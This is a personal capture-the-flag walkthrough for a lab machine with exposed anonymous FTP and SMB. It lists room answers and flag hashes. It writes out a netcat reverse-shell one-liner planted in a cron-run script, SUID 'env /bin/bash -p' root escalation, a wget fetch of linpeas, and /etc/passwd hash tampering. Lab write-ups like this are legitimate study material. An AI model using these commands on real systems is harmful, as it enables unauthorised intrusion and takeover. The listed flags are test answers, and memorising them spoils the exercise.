export IP=10.10.218.214


==================================================

[TASK 1] - Pwn

1) Enumerate the machine. How many ports are open?

	Answer: `4`

2) What service is running on port 21?

	Answer: `FTP`

3) What service is running on ports 139 and 445?

	Answer: `SMB`

4) There's a share on the user's computer. What's it called?

	Answer: `pics`

5) user.txt

	Answer: `90d6f992585815ff991e68748c414740`
	Notes: See approach step 4.

6) root.txt

	Answer: `4d930091c31a622a7ed10f27999af363`
	Command: `env /bin/bash -p`
	Notes:
		- Using the reverse shell, I used wget to install linpeas.sh.
		- Found an exploit with /usr/bin/env.
		- Found a command in GTFOBins to use the 'env' command to break me into a root shell.


==================================================

[IMPORTANT INFORMATION]

SMB username = ANONYMOUS
SMB password = namelessone

Reverse Shell Using FTP:
	1) [my machine]: `nc -lnvp 2222`
	2) [victim using clean.sh]: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.8.203 2222 >/tmp/f`

Gain Root Access:
	`env /bin/bash -p`


==================================================

[APPROACH]

1) There is FTP access on port 21. Was able login using 'anonymous'. First, I tried 'mget' to download the files back onto my machine, but that didn't work. I looked up a solution and found the following command:

	Command: `wget -r ftp://anonymous:anonymous@$IP/scripts`
	Notes:
		- Moved the download 'scripts' folder into 'FTP-anonymous/'.

2) Opened up Metasploit to search for some SMB exploits.

	Notes:
		- Found an exploit for enumerating the shares: 'auxiliary/scanner/smb/smb_enumshares'
			> print$ - (DISK) Printer Drivers
			> pics - (DISK) My SMB Share Directory for Pics
			> IPC$ - (IPC) IPC Service (anonymous server (Samba Ubuntu))
		- Found an exploit for enumerating the users: 'auxiliary/scanner/smb/smb_enumusers'
			> ANONYMOUS [ namelessone ] ( LockoutTries=0 PasswordMin=5 )

3) Now that I have some information about the SMB share, I can start poking around.

	Commands: 
		1) `smbclient //$IP/pics` + `namelessone`
			> Was able to view what was in the pics folder.
		2) `smbget -R //$IP/pics`
			> Downloaded everything from the pics folder. Don't think anything was there. Just photos of dogs.

4) Revisting FTP. Gain reverse shell.

	Commands:
		1) [my machine]: `nc -lnvp 2222`
		2) [victim using clean.sh]: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.8.203 2222 >/tmp/f`
	Notes:
		- Noticed that the 'clean_up.sh' script gets called regularly based off what I can see inside the 'removed_files.log'.
		- Going to try to start a reverse shell using this knowledge.
		- Was having trouble getting a reverse shell using the 'clean.sh' script. Instead I went ahead and just copied '/etc/passwd' and '/home/namelessone' into the '/var/ftp/scripts' folder which allowed me to save them locally to my folder.
		- Using 'clean.sh', I was able to get my reverse shell working!

5) A litte fun...
	
	Commands:
		1) [locally]: `python3` + `import crypt` + `crypt.crypt('password')`
			> Printed out the hashed password.
		2) [victim]: `nano /etc/passwd`
			> Locate 'namelessone' and replace the first x with hashed password.
		3) [victim]: `sudo -i` + `password`
			> You now have a root shell.
	Notes:
		- Once root, I decided to try changing namelessone's password and did so by running the above commands and steps.
		- With that, I was able to SSH into the box.
